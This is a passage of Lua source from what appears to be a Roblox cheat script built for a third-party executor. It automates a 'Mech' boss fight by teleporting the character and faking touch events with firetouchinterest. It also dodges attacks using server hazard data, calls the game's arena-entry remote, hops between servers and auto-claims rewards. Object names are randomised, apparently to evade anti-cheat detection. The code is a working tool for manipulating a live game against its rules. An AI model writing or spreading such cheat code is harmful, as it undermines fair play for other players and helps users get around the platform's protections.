			frame2.Name = func3()
			frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			frame2.BorderSizePixel = 0
			frame2.Position = UDim2.fromOffset(22, 22)
			frame2.Size = UDim2.fromOffset(5, 26)
			frame2.ZIndex = 12
			frame2.Parent = frame
			createUIGradient(frame2, flag312, 90)
			createUIStroke(frame2, Enum.ApplyStrokeMode.Border, 1.4)
			local textLabel = Instance.new("TextLabel")
			textLabel.Name = func3()
			textLabel.BackgroundTransparency = 1
			textLabel.Position = UDim2.fromOffset(38, 20)
			textLabel.Size = UDim2.fromOffset(370, 30)
			textLabel.TextXAlignment = Enum.TextXAlignment.Left
			textLabel.TextYAlignment = Enum.TextYAlignment.Center
			textLabel.ZIndex = 12
			textLabel.Parent = frame
			func236(textLabel, 21)
			func233(textLabel, func232("Title"))
			local frame3 = Instance.new("Frame")
			frame3.Name = func3()
			frame3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			frame3.BackgroundTransparency = 0.82
			frame3.BorderSizePixel = 0
			frame3.Position = UDim2.fromOffset(22, 58)
			frame3.Size = UDim2.fromOffset(386, 1)
			frame3.ZIndex = 12
			frame3.Parent = frame
			local textLabel2 = Instance.new("TextLabel")
			textLabel2.Name = func3()
			textLabel2.BackgroundTransparency = 1
			textLabel2.Position = UDim2.fromOffset(22, 68)
			textLabel2.Size = UDim2.fromOffset(386, 24)
			textLabel2.TextXAlignment = Enum.TextXAlignment.Left
			textLabel2.TextYAlignment = Enum.TextYAlignment.Center
			textLabel2.ZIndex = 12
			textLabel2.Parent = frame
			createUIStroke2(textLabel2, 17)
			textLabel2.TextColor3 = Color3.fromRGB(255, 72, 72)
			createUIGradient(textLabel2, ColorSequence.new(Color3.fromRGB(255, 132, 123), Color3.fromRGB(239, 28, 28)), 90)
			func233(textLabel2, func232("Warn"))
			local textLabel3 = Instance.new("TextLabel")
			textLabel3.Name = func3()
			textLabel3.BackgroundTransparency = 1
			textLabel3.Position = UDim2.fromOffset(22, 98)
			textLabel3.Size = UDim2.fromOffset(386, 74)
			textLabel3.TextWrapped = true
			textLabel3.TextXAlignment = Enum.TextXAlignment.Left
			textLabel3.TextYAlignment = Enum.TextYAlignment.Top
			textLabel3.ZIndex = 12
			textLabel3.Parent = frame
			createUIStroke2(textLabel3, 15)
			textLabel3.LineHeight = 1.14
			textLabel3.TextTransparency = 0.12
			func233(textLabel3, func232("Body"))
			local textLabel4 = Instance.new("TextLabel")
			textLabel4.Name = func3()
			textLabel4.BackgroundTransparency = 1
			textLabel4.Position = UDim2.fromOffset(22, 176)
			textLabel4.Size = UDim2.fromOffset(386, 46)
			textLabel4.TextWrapped = true
			textLabel4.TextXAlignment = Enum.TextXAlignment.Left
			textLabel4.TextYAlignment = Enum.TextYAlignment.Top
			textLabel4.ZIndex = 12
			textLabel4.Parent = frame
			createUIStroke2(textLabel4, 14)
			textLabel4.LineHeight = 1.12
			textLabel4.TextColor3 = Color3.fromRGB(255, 176, 120)
			func233(textLabel4, func232("Tip"))

			local function func238(param167, param168, color7)
				local textButton2 = Instance.new("TextButton")
				textButton2.Name = func3()
				textButton2.Active = true
				textButton2.AutoButtonColor = false
				textButton2.BackgroundTransparency = 1
				textButton2.BorderSizePixel = 0
				textButton2.Position = UDim2.fromOffset(param167, 244)
				textButton2.Size = UDim2.fromOffset(param168, 46)
				textButton2.Text = ""
				textButton2.ZIndex = 14
				textButton2.Parent = frame
				local frame4 = Instance.new("Frame")
				frame4.Name = func3()
				frame4.AnchorPoint = Vector2.new(0.5, 0.5)
				frame4.BackgroundColor3 = color7 and Color3.fromRGB(175, 0, 0) or Color3.fromRGB(24, 25, 30)
				frame4.BorderSizePixel = 0
				frame4.Position = UDim2.fromScale(0.5, 0.5)
				frame4.Size = UDim2.fromScale(1, 0.92)
				frame4.ZIndex = 12
				frame4.Parent = textButton2
				createUIStroke(frame4, Enum.ApplyStrokeMode.Border, 1.6)
				local frame5 = Instance.new("Frame")
				frame5.Name = func3()
				frame5.AnchorPoint = Vector2.new(0.5, 0)
				frame5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				frame5.BorderSizePixel = 0
				frame5.Position = UDim2.fromScale(0.5, 0)
				frame5.Size = UDim2.fromScale(1, 0.9)
				frame5.ZIndex = 12
				frame5.Parent = frame4
				createUIGradient(frame5, color7 and flag312 or value239, 90)
				local frame6 = Instance.new("Frame")
				frame6.Name = func3()
				frame6.AnchorPoint = Vector2.new(0.5, 0.5)
				frame6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				frame6.BorderSizePixel = 0
				frame6.Position = UDim2.fromScale(0.5, 0.5)
				frame6.Size = UDim2.fromScale(0.965, 0.88)
				frame6.ZIndex = 13
				frame6.Parent = frame5
				createUIGradient(frame6, color7 and flag313 or value239, 90)
				local textLabel5 = Instance.new("TextLabel")
				textLabel5.Name = func3()
				textLabel5.AnchorPoint = Vector2.new(0.5, 0.5)
				textLabel5.BackgroundTransparency = 1
				textLabel5.Position = UDim2.fromScale(0.5, 0.5)
				textLabel5.Size = UDim2.fromScale(0.9, 0.6)
				textLabel5.TextWrapped = true
				textLabel5.ZIndex = 15
				textLabel5.Parent = textButton2
				func236(textLabel5, 17)
				return textButton2, textLabel5
			end

			local value240, value241 = func238(22, 184, false)
			local value242, value243 = func238(224, 184, true)
			func233(value241, func232("Cancel"))
			func233(value243, func232("Accept"))

			value226 = {
				{ textLabel, "Title" },
				{ textLabel2, "Warn" },
				{ textLabel3, "Body" },
				{ textLabel4, "Tip" },
				{ value241, "Cancel" },
				{ value243, "Accept" },
			}

			func234()

			list35[#list35 + 1] = value240.MouseButton1Click:Connect(function()
				if value228 then
					value228()
				end
			end)

			list35[#list35 + 1] = value242.MouseButton1Click:Connect(function()
				if value227 then
					value227()
				end
			end)

			local currentCamera = workspace.CurrentCamera

			if currentCamera then
				list35[#list35 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(func235)
			end

			func235()
			screenGui.Parent = value1
		end

		local function func239()
			func237()
			func235()

			if screenGui then
				screenGui.Enabled = true
			end
		end

		func4(function()
			for _, item81 in ipairs(list35) do
				pcall(function()
					item81:Disconnect()
				end)
			end

			table.clear(list35)

			if screenGui then
				pcall(function()
					screenGui:Destroy()
				end)

				screenGui = nil
			end
		end)

		return {
			Manual = manual,
			Hide = hide,
			Show = function(list36, callback9, callback10)
				for k, value244 in pairs(list36) do
					tbl194[k] = value244
				end

				func234()

				value227 = function()
					hide()

					if callback9 then
						callback9()
					end
				end

				value228 = function()
					hide()

					if callback10 then
						callback10()
					end
				end

				func239()
				func234()
			end,
		}
	end

	str1.HopPrompt = func231()

	str1.MechBoot = function(obj37)
		local ok, result = pcall(function()
			return require(ReplicatedStorage.Shared.Util.ScrambleBossHazards)
		end)

		local mech = {
			Handle = nil,
			Row = nil,
			Status = "Idle",
			Shown = nil,
			Busy = false,
			Generation = 0,
			Hazards = {},
			TravelSpeed = 250,
			Radius = 18,
			SwingGap = 0.12,
			Dodge = true,
			TryBall = true,
			Leave = true,
			HopWindow = 3,
			OpenSeconds = 900,
			ChainPath = "ChilliLibrary/SAE_BossHop.json",
			ChainUntil = 0,
			ChainCycle = nil,
			ArmedCycle = nil,
			HopStamp = 0,
			ArrivedByHop = false,
			HopDelay = 5,
			HopConfirmed = false,
			HopNote = nil,
			HopAt = nil,
			Hopping = false,
			LoadedAt = os.clock(),
			BaitSpeed = 225,
			Interval = 1800,
			Run = nil,
			SwapTools = true,
			SwapIndex = 1,
			SwapSince = 0,
			MainHold = 0.3,
			SecondHold = 0.4,
			LastSwing = 0,
			Links = {},
		}

		str1.Mech = mech

		local function func240()
			return str1.Toggle(mech.Handle, false) == true
		end

		local function func241()
			return workspace:FindFirstChild("ScrambleArena")
		end

		local function func242()
			return workspace:FindFirstChild("ScrambleArenaPortal")
		end

		local function func243()
			return str1.InMechArena()
		end

		mech.StealFirst = function()
			local steal = str1.Steal
			if str1.Toggle(value2, false) == true and steal ~= nil and steal.Carrying == true then
				return "Delivering the egg first"
			end

			if str1.Toggle(value2, false) == true and steal ~= nil and steal.BossOverride == true then
				return "A filtered egg showed up, stealing it first"
			end
			return nil
		end

		mech.Defeated = function()
			local result42 = func241()
			local flag314 = result42 and tostring(result42:GetAttribute("Phase")) or ""
			return flag314 == "Defeated" or flag314 == "Final" or flag314 == "Ended" or flag314 == "Won"
		end

		mech.CycleDone = function()
			return mech.DoneCycle ~= nil and mech.DoneCycle == math.floor(workspace:GetServerTimeNow() / mech.Interval)
		end

		str1.MechFirst = function()
			if not func240() or mech.Hopping or mech.CycleDone() then
				return false
			end
			local steal = str1.Steal
			if steal ~= nil and (steal.Carrying == true or steal.BossOverride == true) then
				return false
			end

			if func243() then
				return not mech.Defeated()
			end
			return mech.Busy == true or func242() ~= nil
		end

		pcall(function()
			local scheduleIntervalSeconds = require(ReplicatedStorage.Shared.Flags.ScrambleBossFlags).ScheduleIntervalSeconds
			local interval = type(scheduleIntervalSeconds) == "table" and tonumber(scheduleIntervalSeconds.Value) or nil

			if interval and interval > 0 then
				mech.Interval = interval
			end
		end)

		mech.Clock = function(num84)
			local n5 = math.max(0, math.floor(num84 + 0.5))
			return string.format("%d:%02d", math.floor(n5 / 60), n5 % 60)
		end

		mech.Timer = function()
			local serverTimeNow = workspace:GetServerTimeNow()
			local scrambleArena = workspace:FindFirstChild("ScrambleArena")
			scrambleArena = scrambleArena and tonumber(scrambleArena:GetAttribute("SpawnsAt")) or 0

			if workspace:FindFirstChild("ScrambleArenaPortal") then
				if serverTimeNow < scrambleArena then
					return "Mech portal is open  |  boss spawns in " .. mech.Clock(scrambleArena - serverTimeNow)
				end
				return "Mech portal is open now"
			end

			local interval = mech.Interval
			return "Next Mech portal in " .. mech.Clock(math.ceil(serverTimeNow / interval) * interval - serverTimeNow)
		end

		local function func244(instance7)
			if not instance7 then
				return nil
			end
			local hitbox = instance7:FindFirstChild("Hitbox", true)
			if hitbox and hitbox:IsA("BasePart") then
				return hitbox
			end

			for _, descendant in ipairs(instance7:GetDescendants()) do
				if descendant:IsA("TouchTransmitter") and descendant.Parent and descendant.Parent:IsA("BasePart") then
					return descendant.Parent
				end
			end

			return nil
		end

		local function func245(flag315)
			local flag316 = str1.Root()
			if not flag316 or not flag315 or type(firetouchinterest) ~= "function" then
				return
			end

			pcall(function()
				firetouchinterest(flag316, flag315, 0)
				task.wait(0.05)
				firetouchinterest(flag316, flag315, 1)
			end)
		end

		local function func246(param169, flag317)
			if not mech.Dodge or not ok or type(result) ~= "table" or type(result.Contains) ~= "function" then
				return false
			end

			for k, hazard in pairs(mech.Hazards) do
				local n5 = tonumber(hazard.At) or 0
				local n6 = tonumber(hazard.Warn) or 0
				if flag317 > n5 + (tonumber(hazard.Duration) or 0.5) + 1.5 then
					mech.Hazards[k] = nil
					continue
				end

				if not (n5 - n6 - 0.1 <= flag317) then
					continue
				end
				local ok2, result2 = pcall(result.Contains, hazard, param169, flag317)
				if ok2 and result2 then
					return true
				end
			end

			return false
		end

		local function func247()
			local character = localPlayer.Character
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")

			for _, item82 in ipairs({ character, backpack }) do
				if item82 then
					for _, child in ipairs(item82:GetChildren()) do
						if child:IsA("Tool") and tostring(child:GetAttribute("ItemType")) == "Gear" then
							if string.find(string.lower(tostring(child:GetAttribute("GearName") or "")), "scrambler", 1, true) then
								return child
							end
						end
					end
				end
			end

			return nil
		end

		local function func248()
			local lastSwing = mech.LastSwing
			if os.clock() - lastSwing < mech.SwingGap then
				return
			end
			mech.LastSwing = os.clock()
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")
			local findBat = type(str1.FindBat) == "function" and str1.FindBat() or nil
			local swapTools = mech.SwapTools and func247() or nil
			local obj38

			if findBat and swapTools and findBat ~= swapTools then
				local secondHold = mech.SwapIndex == 2 and mech.SecondHold or mech.MainHold
				local swapSince = mech.SwapSince

				if os.clock() - swapSince >= secondHold then
					mech.SwapIndex = mech.SwapIndex == 2 and 1 or 2
					mech.SwapSince = os.clock()
				end

				swapTools = mech.SwapIndex == 2 and swapTools
				obj38 = swapTools or findBat
			else
				obj38 = findBat or swapTools
			end

			if not obj38 or not humanoid then
				return
			end

			if obj38.Parent ~= character then
				pcall(function()
					humanoid:EquipTool(obj38)
				end)
			end

			pcall(function()
				obj38:Activate()
			end)
		end

		local function func249(num85, param170)
			local character = localPlayer.Character
			local flag318 = str1.Root()
			if not character or not flag318 then
				return
			end

			if (flag318.Position - num85).Magnitude > 3 then
				pcall(function()
					character:PivotTo(CFrame.lookAt(num85, Vector3.new(param170.X, num85.Y, param170.Z)))
					flag318.AssemblyLinearVelocity = Vector3.zero
				end)
			end
		end

		local function func250(instance8)
			local mech2 = instance8:FindFirstChild("Mech")
			local hitbox = mech2 and mech2:FindFirstChild("Hitbox")
			if hitbox and hitbox:IsA("BasePart") then
				return hitbox.Position, mech2
			end

			for _, child in ipairs(instance8:GetChildren()) do
				if child:IsA("Model") and child.Name ~= "Ball" and child.Name ~= "LeaveTeleport" and child.Name ~= "Structure" then
					local hitbox2 = child:FindFirstChild("Hitbox")
					if hitbox2 and hitbox2:IsA("BasePart") then
						return hitbox2.Position, child
					end
				end
			end

			return nil, nil
		end

		local function func251(instance9, part13)
			local ball = instance9:FindFirstChild("Ball")
			if not ball then
				return false
			end
			local position = ball:GetBoundingBox().Position
			local n5 = (tonumber(instance9:GetAttribute("FloorY")) or position.Y) + 3
			local n6 = tonumber(instance9:GetAttribute("CoreStage")) or 0

			if instance9:GetAttribute("BallStunned") == true then
				mech.Run = nil
				local vector = Vector3.new(part13.Position.X - position.X, 0, part13.Position.Z - position.Z)
				local unit = vector.Magnitude > 1 and vector.Unit or Vector3.new(1, 0, 0)
				func249(Vector3.new(position.X, n5, position.Z) + unit * 10, position)
				func248()
				mech.Status = string.format("Smashing the core  |  stage %d / 3  |  core %s", n6, tostring(instance9:GetAttribute("CoreHealth") or "?"))
				return true
			end

			local str23 = tostring(instance9:GetAttribute("BallTarget"))
			local attribute = instance9:GetAttribute("BallCoil")

			if not mech.Run and str23 == tostring(localPlayer.UserId) and type(attribute) == "string" and attribute ~= "" then
				local coils = instance9:FindFirstChild("Coils")
				coils = coils and coils:FindFirstChild(attribute)
				coils = coils and coils:GetAttribute("Home")

				if typeof(coils) == "Vector3" then
					local vector = Vector3.new(coils.X - position.X, 0, coils.Z - position.Z)

					if vector.Magnitude > 1 then
						local n7 = vector.Unit * 40
						mech.Run = { Goal = Vector3.new(coils.X, n5, coils.Z) + n7, Until = os.clock() + 8, Coil = attribute }
					end
				end
			end

			if mech.Run then
				local vector = Vector3.new(mech.Run.Goal.X - part13.Position.X, 0, mech.Run.Goal.Z - part13.Position.Z)
				local flag319 = vector.Magnitude < 4

				if not flag319 then
					local until_ = mech.Run.Until
					flag319 = os.clock() > until_
				end

				if flag319 then
					mech.Run = nil

					pcall(function()
						part13.AssemblyLinearVelocity = Vector3.new(0, part13.AssemblyLinearVelocity.Y, 0)
					end)
				else
					local n7 = vector.Unit * mech.BaitSpeed

					pcall(function()
						part13.AssemblyLinearVelocity = Vector3.new(n7.X, part13.AssemblyLinearVelocity.Y, n7.Z)
					end)

					mech.Status = string.format("Baiting the ball into %s  |  stage %d / 3", mech.Run.Coil, n6)
				end

				return true
			end

			local vector = Vector3.new(part13.Position.X - position.X, 0, part13.Position.Z - position.Z)

			if vector.Magnitude > 18 or vector.Magnitude < 6 then
				local vector2 = vector.Magnitude < 1 and Vector3.new(1, 0, 0) or vector.Unit
				func249(Vector3.new(position.X, n5, position.Z) + vector2 * 12, position)
			end

			mech.Status = string.format("Ball phase, waiting for it to lock on  |  stage %d / 3", n6)
			return true
		end

		local function func252(instance10, part14)
			local scrambleHuman = instance10:FindFirstChild("ScrambleHuman")
			if not scrambleHuman then
				return false
			end
			local humanoidRootPart = scrambleHuman:FindFirstChild("HumanoidRootPart") or scrambleHuman.PrimaryPart or scrambleHuman:FindFirstChildWhichIsA("BasePart")
			local position = humanoidRootPart and humanoidRootPart.Position or scrambleHuman:GetPivot().Position
			humanoidRootPart = humanoidRootPart and humanoidRootPart.AssemblyLinearVelocity or Vector3.zero
			local n5 = position + Vector3.new(humanoidRootPart.X, 0, humanoidRootPart.Z) * 0.15
			local vector = Vector3.new(part14.Position.X - n5.X, 0, part14.Position.Z - n5.Z)
			local vector2 = vector.Magnitude > 1 and vector.Unit * 5 or Vector3.zero
			local n6 = Vector3.new(n5.X, part14.Position.Y, n5.Z) + vector2
			local character = localPlayer.Character

			pcall(function()
				character:PivotTo(CFrame.lookAt(n6, Vector3.new(position.X, n6.Y, position.Z)))
			end)

			func248()
			mech.Status = string.format("Chasing Dr Scramble  |  hits %s / %s", tostring(instance10:GetAttribute("HumanHits") or 0), tostring(instance10:GetAttribute("HumanNeeded") or 3))
			return true
		end

		local function func253()
			local result43 = func241()
			local num86 = str1.Root()
			local character = localPlayer.Character
			character = character and character:FindFirstChildOfClass("Humanoid")
			if not result43 or not num86 then
				return
			end
			local str24 = tostring(result43:GetAttribute("Phase"))
			local n5 = tonumber(result43:GetAttribute("Health")) or 0
			local n6 = tonumber(result43:GetAttribute("MaxHealth")) or 0

			if tostring(result43:GetAttribute("GrabVictim")) == tostring(localPlayer.UserId) and character then
				character.Jump = true
				func248()
				mech.Status = "Grabbed, breaking free"
				return
			end

			if str24 == "Ball" and mech.TryBall and func251(result43, num86) then
				return
			end

			if str24 == "Human" and func252(result43, num86) then
				return
			end
			local flag320, obj39 = func250(result43)

			if not flag320 then
				local n7 = (tonumber(result43:GetAttribute("SpawnsAt")) or 0) - workspace:GetServerTimeNow()
				mech.Status = n7 > 0 and "In the arena  |  boss spawns in " .. mech.Clock(n7) or string.format("Phase %s, waiting for the boss", str24)
				return
			end

			local serverTimeNow = workspace:GetServerTimeNow()
			local n7 = (tonumber(result43:GetAttribute("FloorY")) or flag320.Y) + 3
			local value245 = nil
			local value246 = nil

			for i = 0, 15 do
				local n8 = i / 16 * 3.1415926535897931 * 2
				local radius = mech.Radius
				local z = flag320.Z
				local radius2 = mech.Radius
				local vector = Vector3.new(flag320.X + math.cos(n8) * radius, n7, z + math.sin(n8) * radius2)
				local magnitude = (vector - num86.Position).Magnitude

				if func246(vector, serverTimeNow) or func246(vector, serverTimeNow + 0.4) then
					magnitude += 10000
				end

				if not value245 or magnitude < value245 then
					value245 = magnitude
					value246 = vector
				end
			end

			if value246 then
				func249(value246, flag320)
			end

			func248()
			obj39 = obj39 and obj39:GetAttribute("Overheated") == true
			mech.Status = string.format("Fighting %s  |  boss %d / %d%s", str24, math.floor(n5 + 0.5), math.floor(n6 + 0.5), obj39 and "  |  OVERHEAT" or "")
		end

		local function func254()
			local result44 = func241()
			local flag321 = func244(result44 and result44:FindFirstChild("LeaveTeleport"))
			if not flag321 then
				return
			end
			local character = localPlayer.Character

			pcall(function()
				character:PivotTo(CFrame.new(flag321.Position + Vector3.new(0, 3, 0)))
			end)

			task.wait(0.2)
			func245(flag321)
		end

		str1.MechLeave = function()
			for i = 1, 2 do
				if not func243() then
					return true
				end
				pcall(func254)
				local n5 = 0

				while func243() and n5 < 4 do
					n5 += task.wait(0.2)
				end
			end

			return not func243()
		end

		local function func255(flag322)
			local result45 = func242()
			local flag323 = func244(result45)
			if not result45 or not flag323 then
				return false
			end
			local stealHome2 = type(str1.StealHome) == "function" and str1.StealHome() or nil

			if stealHome2 and str1.InsideBase() then
				local respawned = mech.Respawned == true
				local n5 = stealHome2 + Vector3.new(0, 3, 0)
				local travelSpeed = respawned and math.min(mech.TravelSpeed, 300) or mech.TravelSpeed
				local now = os.clock()

				while os.clock() - now < 20 do
					if flag322 ~= mech.Generation or not func240() or func243() or mech.StealFirst() then
						return false
					end
					local num87 = str1.Root()
					if not num87 then
						return false
					end
					local n6 = n5 - num87.Position
					if n6.Magnitude <= 4 then
						break
					end
					mech.Status = respawned and "Respawned, going out through the safe zone" or "Leaving the base through the safe zone"
					local magnitude = n6.Magnitude
					local n7 = math.min(travelSpeed * RunService.Heartbeat:Wait(), magnitude)

					pcall(function()
						local rotation = num87.CFrame.Rotation
						num87.CFrame = CFrame.new(num87.Position + n6.Unit * n7) * rotation
						num87.AssemblyLinearVelocity = Vector3.zero
					end)
				end

				if respawned then
					mech.Status = "Respawned, resting in the safe zone"
					local n6 = 0

					while n6 < 0.75 do
						local value247 = str1.Root()

						if value247 then
							pcall(function()
								value247.AssemblyLinearVelocity = Vector3.zero
							end)
						end

						n6 += RunService.Heartbeat:Wait()
					end
				end
			end

			mech.Respawned = false

			for i = 1, 5 do
				if not (flag322 ~= mech.Generation or not func240() or func243() or mech.StealFirst()) then
					local flag324 = str1.Root()

					if not (not flag324 or not flag323.Parent) then
						mech.Status = "Teleporting to the Mech portal"

						pcall(function()
							flag324.CFrame = flag323.CFrame + Vector3.new(0, 1, 0)
							flag324.AssemblyLinearVelocity = Vector3.zero
							flag324.AssemblyAngularVelocity = Vector3.zero
						end)

						func245(flag323)
						local n5 = os.clock() + 0.6

						while os.clock() < n5 and not func243() do
							RunService.Heartbeat:Wait()
						end

						continue
					end
				end

				break
			end

			if func243() then
				return true
			end
			local position = flag323.Position
			local now = os.clock()
			local exitTo = nil
			local num88

			while true do
				if not (os.clock() - now < 60) then
					exitTo = 1
					break
				else
					if flag322 ~= mech.Generation or not func240() or func243() or mech.StealFirst() then
						exitTo = 1
						break
					else
						num88 = str1.Root()

						if not num88 then
							exitTo = 2
							break
						else
							local vector = Vector3.new(position.X - num88.Position.X, 0, position.Z - num88.Position.Z)

							if not (vector.Magnitude <= 14) then
								local n5 = vector.Unit * math.min(mech.TravelSpeed, vector.Magnitude / 0.05)
								mech.Status = string.format("Going to the Mech portal, %d studs", math.floor(vector.Magnitude + 0.5))

								pcall(function()
									num88.AssemblyLinearVelocity = Vector3.new(n5.X, num88.AssemblyLinearVelocity.Y, n5.Z)
								end)

								RunService.Heartbeat:Wait()
								continue
							end
						end
					end

					break
				end
			end

			if exitTo ~= 1 then
				if exitTo == 2 then
					return false
				end

				pcall(function()
					num88.AssemblyLinearVelocity = Vector3.zero
				end)

				func245(flag323)
				task.wait(0.4)

				if not func243() then
					pcall(function()
						local rfScrambleBossEnterArena = networking:FindFirstChild("RF/ScrambleBoss/EnterArena")

						if rfScrambleBossEnterArena then
							rfScrambleBossEnterArena:InvokeServer()
						end
					end)
				end
			end

			local now2 = os.clock()

			while not func243() and os.clock() - now2 < 5 do
				task.wait(0.1)
			end

			return func243()
		end

		local function func256()
			mech.Busy = true
			mech.Generation = mech.Generation + 1
			local generation = mech.Generation
			str1.Shield("mech", true)

			pcall(function()
				if str1.Treadmill and str1.Treadmill.Riding or type(str1.OnBelt) == "function" and str1.OnBelt() then
					str1.ExitBelt()
				end
			end)

			if not func243() and not mech.StealFirst() then
				pcall(func255, generation)
			end

			while generation == mech.Generation and func240() and func243() and not mech.StealFirst() do
				local result46 = func241()
				local flag325 = result46 and tostring(result46:GetAttribute("Phase")) or ""

				if flag325 == "Defeated" or flag325 == "Final" or flag325 == "Ended" or flag325 == "Won" then
					mech.Status = "Dr Scramble defeated, going back home"

					if not mech.DefeatedAt and type(mech.StartChain) == "function" then
						pcall(mech.StartChain)
					end

					mech.DefeatedAt = mech.DefeatedAt or os.clock()
					mech.DoneCycle = math.floor(workspace:GetServerTimeNow() / mech.Interval)
					local leave = mech.Leave

					if leave then
						local defeatedAt = mech.DefeatedAt
						leave = os.clock() - defeatedAt > 1
					end

					if leave then
						pcall(func254)
						task.wait(2)
					else
						task.wait(0.3)
					end
				else
					pcall(func253)
					RunService.Heartbeat:Wait()
				end
			end

			if func243() and mech.StealFirst() then
				mech.Status = tostring(mech.StealFirst()) .. ", leaving the arena"
				pcall(func254)
				local n5 = 0

				while func243() and n5 < 5 do
					n5 += task.wait(0.2)
				end
			end

			mech.DefeatedAt = nil
			mech.Run = nil
			str1.Shield("mech", false)
			str1.ReleaseMovement("mech")
			mech.Busy = false
			tbl2.Wake()
		end

		pcall(function()
			local reScrambleBossHazard = networking:FindFirstChild("RE/ScrambleBoss/Hazard")

			if reScrambleBossHazard and reScrambleBossHazard:IsA("RemoteEvent") then
				table.insert(mech.Links, reScrambleBossHazard.OnClientEvent:Connect(function(param171)
					if type(param171) == "table" then
						mech.Hazards[param171.Id or #mech.Hazards + 1] = param171
					end
				end))
			end
		end)

		table.insert(mech.Links, localPlayer.CharacterAdded:Connect(function()
			mech.Respawned = true
		end))

		mech.Row = obj37:CreateText({ Name = "Mech Status", Text = "Idle" })

		mech.Handle = obj37:CreateToggle({
			Name = "Auto Mech Boss",
			Default = false,
			Callback = function()
				if not func240() then
					mech.Generation = mech.Generation + 1
				end

				tbl2.Wake()
			end,
		})

		for _, item83 in ipairs({
			{ "Mech Tween Speed", 100, 1000, 250, 10, "studs/s", "TravelSpeed" },
			{ "Main Weapon Hold", 0, 1.5, 0.3, 0.01, "s", "MainHold" },
			{ "Scrambler Hold", 0, 1.5, 0.4, 0.01, "s", "SecondHold" },
		}) do
			obj37:CreateSlider({
				Name = item83[1],
				Min = item83[2],
				Max = item83[3],
				Default = item83[4],
				Increment = item83[5],
				Unit = item83[6],
				SubOf = mech.Handle,
				Callback = function(value)
					mech[item83[7]] = math.clamp(tonumber(value) or item83[4], item83[2], item83[3])
				end,
			})
		end

		for _, item84 in ipairs({
			{ "Swap Two Weapons", "SwapTools" },
			{ "Dodge Attacks", "Dodge" },
			{ "Ball And Core Phase", "TryBall" },
			{ "Leave After Fight", "Leave" },
		}) do
			obj37:CreateToggle({
				Name = item84[1],
				Default = true,
				SubOf = mech.Handle,
				Callback = function(value)
					mech[item84[2]] = value ~= false
				end,
			})
		end

		mech.HopHandle = obj37:CreateToggle({
			Name = "Boss Server Hop",
			Note = "After each boss, hops to a less crowded server to fight again",
			Default = false,
			SubOf = mech.Handle,
			Callback = function()
				mech.HopAt = nil

				if not str1.Toggle(mech.HopHandle, false) then
					mech.HopConfirmed = false
					mech.HopNote = nil
					pcall(str1.HopPrompt.Hide)
					return
				end

				mech.ArmedCycle = math.floor(workspace:GetServerTimeNow() / mech.Interval)
				if not str1.HopPrompt.Manual() then
					mech.HopConfirmed = true
					return
				end
				mech.ArrivedByHop = false
				mech.HopConfirmed = false

				if not pcall(str1.HopPrompt.Show, {
					Title = "Boss Server Hop",
					Warn = "WARNING",
					Body = "After you beat a Mech boss, Boss Server Hop keeps joining less crowded servers. It fights the boss wherever one is still up and hops again when there is none. Turn it off to stop hopping.",
					Tip = "",
					Cancel = "Cancel",
					Accept = "Turn On",
				}, function()
					mech.HopConfirmed = true
					tbl2.Wake()
				end, function()
					pcall(function()
						mech.HopHandle:Set(false)
					end)
				end) then
					mech.HopConfirmed = true
				end
			end,
		})

		local flag326

		flag326 = {
			Loop = 0,
			On = false,
			Run = function(flag327)
				local scrambleRead = str1.ScrambleRead
				local scrambleRequest = str1.ScrambleRequest
				if type(scrambleRead) ~= "function" or type(scrambleRequest) ~= "function" then
					return
				end
				local value248 = scrambleRead(true)
				local state = type(value248) == "table" and value248.State or nil
				if type(state) ~= "table" or value248.Ready ~= true or value248.Enabled ~= true then
					return
				end
				local data = ReplicatedStorage:FindFirstChild("Data")
				local ok2, result2 = pcall(require, data and data:FindFirstChild("ScrambleMastery"))
				if not ok2 or type(result2) ~= "table" or type(result2.Milestones) ~= "table" then
					return
				end
				local claimedMilestoneIds = type(state.ClaimedMilestoneIds) == "table" and state.ClaimedMilestoneIds or {}
				local n5 = tonumber(state.Mastery) or 0
				local tbl199 = {}

				for _, milestone in ipairs(result2.Milestones) do
					local str25 = type(milestone) == "table" and tonumber(milestone.Kills) or nil

					if str25 and milestone.Id and not claimedMilestoneIds[milestone.Id] and n5 >= str25 then
						local ok3, result3 = pcall(result2.Presentation, milestone.Reward)
						ok3 = ok3 and type(result3) == "table" and (result3.Title or result3.Name) or nil

						table.insert(tbl199, {
							Id = milestone.Id,
							Text = (ok3 and tostring(ok3) or "a reward") .. " at " .. str25 .. " kills",
						})
					end
				end

				local ok3, result3 = pcall(result2.FinalMilestone)

				if ok3 and type(result3) == "table" and claimedMilestoneIds[result3.Id] and result2.InfiniteMilestoneId then
					local ok4, result4 = pcall(result2.ClaimableInfiniteCount, state)

					if ok4 then
						ok4 = (tonumber(result4) or 0) > 0
					end

					if ok4 then
						table.insert(tbl199, { Id = result2.InfiniteMilestoneId, Text = "the repeat reward" })
					end
				end

				for _, item85 in ipairs(tbl199) do
					if flag327 ~= flag326.Loop or not flag326.On then
						return
					end
					local Milestone = scrambleRequest("Milestone", item85.Id)

					if type(Milestone) == "table" and Milestone.Ok == true then
						str1.Notify("Boss Mastery", "Claimed " .. item85.Text)
					end

					task.wait(1)
				end
			end,
		}

		obj37:CreateToggle({
			Name = "Auto Claim Mastery",
			Note = "Claims Boss Mastery rewards as soon as they unlock",
			Default = false,
			Callback = function(value)
				flag326.Loop = flag326.Loop + 1
				flag326.On = value == true
				if not flag326.On then
					return
				end
				local loop = flag326.Loop

				task.spawn(function()
					while loop == flag326.Loop and flag326.On do
						pcall(flag326.Run, loop)
						task.wait(10)
					end
				end)
			end,
		})

		func4(function()
			flag326.Loop = flag326.Loop + 1
			flag326.On = false
		end)

		mech.PortalCloses = function()
			local interval = mech.Interval
			return math.floor(workspace:GetServerTimeNow() / mech.Interval) * interval + mech.OpenSeconds
		end

		mech.SaveChain = function()
			if type(writefile) ~= "function" then
				return
			end

			pcall(function()
				if type(isfolder) == "function" and type(makefolder) == "function" and not isfolder("ChilliLibrary") then
					makefolder("ChilliLibrary")
				end

